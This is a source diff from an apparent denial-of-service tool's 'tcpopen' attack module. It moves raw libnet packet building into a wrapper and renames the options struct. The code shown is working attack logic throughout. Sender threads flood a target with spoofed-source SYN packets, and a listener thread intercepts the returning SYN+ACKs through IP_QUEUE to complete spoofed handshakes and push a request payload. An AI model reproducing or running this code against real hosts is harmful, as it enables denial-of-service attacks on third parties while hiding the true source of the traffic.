@@ -23,12 +23,12 @@
  *
  *****************************************************************************/
 
-#include <libnet.h>
-#include <libipq/libipq.h>
+#include <config.h>
 
 #include "dosis.h"
 #include "tea.h"
 #include "tcpopen.h"
+#include "lnet.h"
 #include "ipqex.h"
 #include "pthreadex.h"
 #include "log.h"
@@ -37,92 +37,23 @@
 
 typedef struct _tag_TCPOPEN_WORK {
   THREAD_WORK  *w;
-  libnet_t     *ln;
-  int           ipv4_p;
-  int           tcp_p;
-  int           ip_id;
+  LN_CONTEXT    lnc;
   ipqex_msg_t   msg;
 } TCPOPEN_WORK;
 
 static ipqex_info_t        attack_tcpopen__ipq;
 static pthreadex_flag_t    attack_flag;
 
-/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
- * SEND PACKET
- *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/
-
-static void send_packet(TCPOPEN_WORK *tw,
-                        int flags, int window, int sport,
-                        int seq, int ack,
-                        char *data, int data_sz)
-{
-  int ip_size, tcp_size;
-
-  DBG("[XX_%02u]   Send [D:%d, %d->%d; F:%x; %08x; %08x]",
-      tw->w->id, data_sz, sport, opts.dport, flags, seq, ack);
-  if(!data_sz)
-    data = NULL;
-  tcp_size = LIBNET_TCP_H + data_sz;
-  ip_size  = LIBNET_IPV4_H + tcp_size;
-
-  /* build TCP packet with payload (if requested) */
-  tw->tcp_p =
-    libnet_build_tcp(
-      sport,                    /* source port                               */
-      opts.dport,               /* destination port                          */
-      seq,                      /* sequence number                           */
-      ack,                      /* acknowledgement number                    */
-      flags,                    /* control flags                             */
-      window,                   /* window size                               */
-      0,                        /* sum checksum (0 for libnet to autofill)   */
-      0,                        /* urgent pointer                            */
-      tcp_size,                 /* len total length of the TCP packet        */
-      (unsigned char *) data,   /* payload                                   */
-      data_sz,                  /* payload size                              */
-      tw->ln,                   /* libnet context                            */
-      tw->tcp_p);               /* protocol tag to modify an existing header */
-  if(tw->tcp_p == -1)
-    FAT("[XX_%02u]   Can't build TCP header: %s",
-        tw->w->id, libnet_geterror(tw->ln));
-
-  /* build container IP packet */
-  tw->ipv4_p =
-      libnet_build_ipv4(
-        ip_size,           /* total length of packet (including data) */
-        0x00,              /* type of service bits                    */
-        tw->ip_id++,       /* IP identification number                */
-        0x4000,            /* fragmentation bits and offset           */
-        64,                /* time to live in the network             */
-        IPPROTO_TCP,       /* upper layer protocol                    */
-        0,                 /* checksum (0 for libnet to autofill)     */
-        opts.shost.s_addr, /* source IPv4 address (little endian)     */
-        opts.dhost.s_addr, /* tination IPv4 address (little endian)   */
-        NULL,              /* payload                                 */
-        0,                 /* payload length                          */
-        tw->ln,            /* libnet context                          */
-        tw->ipv4_p);       /* tag to modify an existing header        */
-  if(tw->ipv4_p == -1)
-    FAT("[XX_%02u]   Can't build IP header: %s",
-        tw->w->id, libnet_geterror(tw->ln));
-
-  /* send! */
-  if(libnet_write(tw->ln) == -1)
-    FAT("[XX_%02u]   Error sending packet: %s",
-        tw->w->id, libnet_geterror(tw->ln));
-}
-
-/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+/*****************************************************************************
  * LISTENER THREAD
- *   This thread processes all packets coming from NETFILTER/IP_QUEUE and
- *   add more packages to the queue when we have to answer to some SYN+ACK
- *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/
+ *****************************************************************************/
 
 static void listener_thread(TCPOPEN_WORK *tw)
 {
   int status, fport;
 
   /* filtering port */
-  fport = htons(opts.dport);
+  fport = htons(config.dport);
 
   /* initialize pcap library */
   DBG("[LL_%02u] Initializing IPQ message...", tw->w->id);
@@ -130,7 +61,7 @@ static void listener_thread(TCPOPEN_WORK *tw)
     FAT("[LL_%02u] Cannot initialize IPQ message.", tw->w->id);
 
   /* listen the radio */
-  while(!opts.finalize)
+  while(!config.finalize)
   {
     if((status = ipqex_msg_read(&(tw->msg), 0)) <= 0)
     {
@@ -140,7 +71,7 @@ static void listener_thread(TCPOPEN_WORK *tw)
     } else {
       /* but ... in some circumstances ... */
       if(ipqex_get_ip_header(&(tw->msg))->protocol == 6
-      && ipqex_get_ip_header(&(tw->msg))->daddr == opts.shost.s_addr
+      && ipqex_get_ip_header(&(tw->msg))->daddr == config.shost.s_addr
       && ipqex_get_tcp_header(&(tw->msg))->source == fport)
       {
         DBG("[LL_%02u] Received a spoofed connection packet.", tw->w->id);
@@ -155,7 +86,7 @@ static void listener_thread(TCPOPEN_WORK *tw)
                 ipqex_get_tcp_header(&(tw->msg))->dest, fport,
                 ipqex_get_tcp_header(&(tw->msg))->rst,
                 ipqex_get_ip_header(&(tw->msg))->saddr,
-                opts.shost.s_addr);
+                config.shost.s_addr);
         */
 
         /* ignore any packet that have anything to do with this connection */
@@ -168,19 +99,22 @@ static void listener_thread(TCPOPEN_WORK *tw)
         {
           /* send handshake and data TCP packet */
           DBG("[LL_%02u]   - Request packet sending...", tw->w->id);
-          send_packet(tw, TH_ACK,
-                      ntohs(ipqex_get_tcp_header(&(tw->msg))->window),
-                      ntohs(ipqex_get_tcp_header(&(tw->msg))->dest),
-                      ntohl(ipqex_get_tcp_header(&(tw->msg))->ack_seq),
-                      ntohl(ipqex_get_tcp_header(&(tw->msg))->seq) + 1,
-                      NULL, 0);
-          send_packet(tw, TH_ACK | TH_PUSH,
-                      ntohs(ipqex_get_tcp_header(&(tw->msg))->window),
-                      ntohs(ipqex_get_tcp_header(&(tw->msg))->dest),
-                      ntohl(ipqex_get_tcp_header(&(tw->msg))->ack_seq),
-                      ntohl(ipqex_get_tcp_header(&(tw->msg))->seq) + 1,
-                      opts.req,
-                      opts.req_size);
+          ln_send_packet(&(tw->lnc),
+                         &config.shost, ntohs(ipqex_get_tcp_header(&(tw->msg))->dest),
+                         &config.dhost, config.dport,
+                         TH_ACK,
+                         ntohs(ipqex_get_tcp_header(&(tw->msg))->window),
+                         ntohl(ipqex_get_tcp_header(&(tw->msg))->ack_seq),
+                         ntohl(ipqex_get_tcp_header(&(tw->msg))->seq) + 1,
+                         NULL, 0);
+          ln_send_packet(&(tw->lnc),
+                         &config.shost, ntohs(ipqex_get_tcp_header(&(tw->msg))->dest),
+                         &config.dhost, config.dport,
+                         TH_ACK | TH_PUSH,
+                         ntohs(ipqex_get_tcp_header(&(tw->msg))->window),
+                         ntohl(ipqex_get_tcp_header(&(tw->msg))->ack_seq),
+                         ntohl(ipqex_get_tcp_header(&(tw->msg))->seq) + 1,
+                         (char *) config.req, config.req_size);
         }
       } else
         /* policy: accept anything unknown */
@@ -204,12 +138,12 @@ static void sender_thread(TCPOPEN_WORK *tw)
   DBG("[SS_%02u] Started sender thread", tw->w->id);
 
   /* set how many packets will be sent by this thread */
-  npackets = opts.packets / (opts.c - opts.l);
-  if(tw->w->id == opts.c - 1)
-    npackets += opts.packets - (npackets * (opts.c - opts.l));
+  npackets = config.packets / (config.c - config.l);
+  if(tw->w->id == config.c - 1)
+    npackets += config.packets - (npackets * (config.c - config.l));
 
   /* ATTACK */
-  while(!opts.finalize)
+  while(!config.finalize)
   {
     /* wait for work */
     pthreadex_flag_wait(&attack_flag);
@@ -219,10 +153,12 @@ static void sender_thread(TCPOPEN_WORK *tw)
     for(i = 0; i < npackets; i++)
     {
       seq += libnet_get_prand(LIBNET_PRu16) & 0x00ff;
-      send_packet(tw, TH_SYN,
-                  13337,
-                  libnet_get_prand(LIBNET_PRu16),
-                  seq, 0, NULL, 0);
+      ln_send_packet(&tw->lnc,
+                     &config.shost, libnet_get_prand(LIBNET_PRu16),
+                     &config.dhost, config.dport,
+                     TH_SYN, 13337,
+                     seq, 0,
+                     NULL, 0);
     }
   }
 }
@@ -237,11 +173,10 @@ static void sender_thread(TCPOPEN_WORK *tw)
 static void attack_tcpopen__thread_cleanup(TCPOPEN_WORK *tw)
 {
   /* collect libnet data */
-  if(tw->ln)
-    libnet_destroy(tw->ln);
+  ln_destroy_context(&(tw->lnc));
 
   /* close ipq (if this is a listener thread) */
-  if(tw->w->id < opts.l)
+  if(tw->w->id < config.l)
   {
     DBG("[MM_%02u] Freeing IPQ message...", tw->w->id);
     ipqex_msg_destroy(&(tw->msg));
@@ -252,7 +187,6 @@ static void attack_tcpopen__thread_cleanup(TCPOPEN_WORK *tw)
 
 static void attack_tcpopen__thread(THREAD_WORK *w)
 {
-  char lnet_errbuf[LIBNET_ERRBUF_SIZE];
   int r;
   TCPOPEN_WORK tw;
 
@@ -267,21 +201,13 @@ static void attack_tcpopen__thread(THREAD_WORK *w)
 
   /* initialize libnet */
   DBG("[MM_%02u] Initializing libnet.", tw.w->id);
-  if((tw.ln = libnet_init(LIBNET_RAW4, NULL, lnet_errbuf)) == NULL)
-    FAT("[MM_%02u] Cannot initialize libnet: %s", tw.w->id, lnet_errbuf);
-  tw.tcp_p = LIBNET_PTAG_INITIALIZER;
-  tw.ipv4_p = LIBNET_PTAG_INITIALIZER;
-  tw.ip_id = libnet_get_prand(LIBNET_PRu32);
-
-  if(libnet_seed_prand(tw.ln) < 0)
-    FAT("[MM_%02u] Faild to initialize libnet pseudorandom number generator.",
-        tw.w->id);
+  ln_init_context(&(tw.lnc));
 
   /* wait 4 start */
   pthreadex_barrier_wait(w->start);
 
   /* launch specialized thread */
-  if(w->id < opts.l)
+  if(w->id < config.l)
     listener_thread(&tw);
   else
     sender_thread(&tw);
